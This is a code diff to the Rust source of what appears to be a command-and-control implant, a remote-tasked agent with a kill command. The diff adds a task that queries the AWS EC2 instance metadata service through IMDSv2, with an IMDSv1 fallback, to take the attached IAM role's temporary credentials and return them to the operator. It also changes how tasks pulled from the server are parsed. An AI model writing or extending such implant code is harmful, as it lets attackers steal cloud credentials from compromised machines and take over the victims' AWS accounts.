@@ -329,6 +329,9 @@ pub extern "system" fn Pick() {
                     output.push_str("Killing the implant");
                     kill();
                 }
+                "aws_imds" => {
+                    output.push_str(&execute_aws_imds());
+                }
                 _ => {
                     //if the task name is unknown, return an error
                     //println!("[run_tasks] Unknown task: {}", task);
@@ -351,6 +354,92 @@ pub extern "system" fn Pick() {
             .expect("Failed to execute command");
         let output = String::from_utf8_lossy(&output.stdout);
         output.to_string()
+    }
+
+    /// Query the AWS EC2 Instance Metadata Service (169.254.169.254) for IAM role credentials.
+    /// Tries IMDSv2 (session token) first, then falls back to IMDSv1.
+    fn execute_aws_imds() -> String {
+        const IMDS: &str = "http://169.254.169.254";
+        let client = match Client::builder()
+            .timeout(std::time::Duration::from_secs(3))
+            .build()
+        {
+            Ok(c) => c,
+            Err(e) => return format!("aws_imds: failed to create HTTP client: {e}\n"),
+        };
+
+        let token = match client
+            .put(format!("{IMDS}/latest/api/token"))
+            .header("X-aws-ec2-metadata-token-ttl-seconds", "21600")
+            .send()
+        {
+            Ok(resp) if resp.status().is_success() => resp.text().ok(),
+            Ok(resp) => {
+                return format!(
+                    "aws_imds: IMDSv2 token request failed (HTTP {})\n",
+                    resp.status()
+                );
+            }
+            Err(e) => {
+                return format!(
+                    "aws_imds: cannot reach IMDS at {IMDS} ({e})\n\
+                     (not an EC2 instance, IMDS blocked, or link-local unreachable)\n"
+                );
+            }
+        };
+
+        let mut list_req = client.get(format!(
+            "{IMDS}/latest/meta-data/iam/security-credentials/"
+        ));
+        if let Some(ref t) = token {
+            list_req = list_req.header("X-aws-ec2-metadata-token", t.as_str());
+        }
+
+        let roles_body = match list_req.send() {
+            Ok(resp) if resp.status().is_success() => match resp.text() {
+                Ok(t) => t,
+                Err(e) => return format!("aws_imds: failed to read role list: {e}\n"),
+            },
+            Ok(resp) => {
+                return format!(
+                    "aws_imds: role list request failed (HTTP {})\n",
+                    resp.status()
+                );
+            }
+            Err(e) => return format!("aws_imds: role list request error: {e}\n"),
+        };
+
+        let role = roles_body
+            .lines()
+            .map(str::trim)
+            .find(|l| !l.is_empty())
+            .unwrap_or("");
+
+        if role.is_empty() {
+            return "aws_imds: no IAM instance profile attached (empty role list)\n".to_string();
+        }
+
+        let mut cred_req = client.get(format!(
+            "{IMDS}/latest/meta-data/iam/security-credentials/{role}"
+        ));
+        if let Some(ref t) = token {
+            cred_req = cred_req.header("X-aws-ec2-metadata-token", t.as_str());
+        }
+
+        match cred_req.send() {
+            Ok(resp) if resp.status().is_success() => match resp.text() {
+                Ok(body) => format!(
+                    "aws_imds: role={role}\nIMDS version: {}\n\n{body}\n",
+                    if token.is_some() { "v2" } else { "v1" }
+                ),
+                Err(e) => format!("aws_imds: failed to read credentials: {e}\n"),
+            },
+            Ok(resp) => format!(
+                "aws_imds: credentials request failed (HTTP {})\n",
+                resp.status()
+            ),
+            Err(e) => format!("aws_imds: credentials request error: {e}\n"),
+        }
     }
 
     fn cd(args: Vec<&str>) -> String {
@@ -628,13 +717,14 @@ pub extern "system" fn Pick() {
                         //if the response is Ok, capture the response body, which contains our tasks
                         Ok(response) => {
                             //capture the response body, which contains our tasks
-                            let tasks = response
-                                .text()
-                                .unwrap()
-                                .chars()
-                                //filter out non-alphabetic characters and keep spaces
-                                .filter(|c| c.is_alphabetic() || *c == ' ')
-                                .collect::<String>();
+                            let raw = response.text().unwrap();
+                            let tasks = if raw.trim_start().starts_with('[') {
+                                serde_json::from_str::<Vec<String>>(&raw)
+                                    .unwrap_or_default()
+                                    .join(",")
+                            } else {
+                                raw.trim().to_string()
+                            };
                             //print the tasks for debug
                             //println!("tasks: {}", tasks);
 
